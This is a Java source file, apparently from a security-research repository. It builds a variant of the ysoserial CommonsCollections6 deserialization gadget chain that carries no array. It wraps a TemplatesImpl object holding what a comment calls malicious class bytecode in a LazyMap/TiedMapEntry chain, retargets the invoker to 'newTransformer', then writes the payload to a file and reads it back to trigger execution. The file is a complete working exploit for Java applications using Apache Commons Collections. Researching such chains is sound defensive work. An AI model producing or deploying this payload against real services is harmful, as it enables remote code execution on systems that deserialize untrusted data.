package org.su18.serialize.ysoserial.CommonCollections.CommonCollections6;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.su18.serialize.utils.SerializeUtil;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @author su18
 */
public class CC6WithoutArray {

	public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
		Field field = obj.getClass().getDeclaredField(fieldName);
		field.setAccessible(true);
		field.set(obj, value);
	}

	public static void main(String[] args) throws Exception {
		// 生成包含恶意类字节码的 TemplatesImpl 类
		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();


		Transformer transformer = new InvokerTransformer("getClass", null, null);

		Map innerMap = new HashMap();
		Map outerMap = LazyMap.decorate(innerMap, transformer);

		TiedMapEntry tme = new TiedMapEntry(outerMap, tmpl);

		Map expMap = new HashMap();
		expMap.put(tme, "su18");

		outerMap.clear();
		setFieldValue(transformer, "iMethodName", "newTransformer");

		SerializeUtil.writeObjectToFile(expMap);
		SerializeUtil.readFileObject();

	}

}
